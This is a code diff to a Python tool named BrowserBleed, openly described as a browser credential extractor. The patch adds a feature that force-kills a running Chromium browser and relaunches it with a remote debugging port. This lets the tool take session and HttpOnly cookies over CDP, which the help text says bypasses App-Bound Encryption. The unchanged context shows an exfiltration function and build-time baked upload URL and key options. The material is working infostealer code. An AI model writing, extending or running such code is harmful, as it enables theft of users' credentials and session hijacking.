@@ -54,6 +54,7 @@ if sys.stdout is not None:
 
 # Set True in main() when --verify is passed; gates OIDC discovery network calls
 _do_oidc: bool = False
+_enable_cdp: bool = False
 
 # ── Windows API constants ──────────────────────────────────────────────────────
 PROCESS_VM_READ           = 0x0010
@@ -873,6 +874,56 @@ def _cdp_find_port(process_name: str) -> int | None:
     return None
 
 
+def _cdp_port_alive(port: int) -> bool:
+    try:
+        conn = http.client.HTTPConnection("localhost", port, timeout=1)
+        conn.request("GET", "/json/version")
+        resp = conn.getresponse()
+        return resp.status == 200
+    except Exception:
+        return False
+
+
+def _proc_info(process_name: str) -> tuple[str, str]:
+    """Return (executable_path, command_line) of the first matching process."""
+    try:
+        ps = ("Get-CimInstance Win32_Process -Filter \"Name='{p}'\" | "
+              "Select-Object -First 1 ExecutablePath,CommandLine | "
+              "ConvertTo-Json -Compress").format(p=process_name)
+        r = subprocess.run(
+            ["powershell", "-NonInteractive", "-NoProfile", "-Command", ps],
+            capture_output=True, text=True, timeout=10, creationflags=_NO_WINDOW,
+        )
+        data = json.loads(r.stdout.strip())
+        return data.get("ExecutablePath") or "", data.get("CommandLine") or ""
+    except Exception:
+        return "", ""
+
+
+def relaunch_browser_with_cdp(process_name: str, port: int = 9222) -> bool:
+    exe, cmdline = _proc_info(process_name)
+    if not exe:
+        return False
+
+    m = re.search(r"--user-data-dir=(?:\"([^\"]+)\"|(\S+))", cmdline)
+    user_data_dir = (m.group(1) or m.group(2)) if m else ""
+
+    subprocess.run(["taskkill", "/F", "/IM", process_name],
+                   capture_output=True, creationflags=_NO_WINDOW)
+    time.sleep(1)
+
+    args = [exe, f"--remote-debugging-port={port}"]
+    if user_data_dir:
+        args.append(f"--user-data-dir={user_data_dir}")
+    subprocess.Popen(args, creationflags=_NO_WINDOW)
+
+    for _ in range(30):
+        if _cdp_port_alive(port):
+            return True
+        time.sleep(1)
+    return False
+
+
 def _ws_connect(host: str, port: int, path: str) -> socket.socket:
     s = socket.create_connection((host, port), timeout=8)
     s.settimeout(15)
@@ -1638,6 +1689,9 @@ def process_browser(name: str, process_name: str, user_data_path: str,
                 # Always attempt CDP when browser is running to get session-only/HttpOnly cookies
                 cdp_cookies: list[dict] = []
                 if running:
+                    if _enable_cdp and _cdp_find_port(process_name) is None:
+                        if relaunch_browser_with_cdp(process_name):
+                            lines.append("  [+] Relaunched browser with --remote-debugging-port for CDP")
                     try:
                         cdp_cookies = extract_cookies_cdp(process_name)
                     except Exception:
@@ -1934,7 +1988,7 @@ def _exfil_results(url: str, api_key: str, txt_path: str, csv_path: str | None) 
 
 # ── Main ───────────────────────────────────────────────────────────────────────
 def main():
-    global _do_oidc
+    global _do_oidc, _enable_cdp
 
     parser = argparse.ArgumentParser(
         description="BrowserBleed - Browser Credential Extractor. Authorized use only."
@@ -1946,12 +2000,14 @@ def main():
     parser.add_argument("--max-hits",         type=int, default=_DEFAULT_MAX_HITS, help="Max memory hits per browser before dedup (default: 1000)")
     parser.add_argument("--verify",           action="store_true", default=_DEFAULT_VERIFY,      help="Verify captured tokens against their services (makes outbound requests)")
     parser.add_argument("--export-cookies",   metavar="PATH",      help="Export browser cookies to Netscape jar file for portable use on another machine")
+    parser.add_argument("--enable-cdp",       action="store_true", help="Relaunch a running Chromium browser with --remote-debugging-port to capture cookies via CDP (bypasses App-Bound Encryption)")
     parser.add_argument("--exfil",            metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
     parser.add_argument("--exfil-key",        metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
     args = parser.parse_args()
 
     if args.verify:
         _do_oidc = True
+    _enable_cdp = args.enable_cdp
 
     do_disk   = not args.memory_only
     do_memory = not args.disk_only
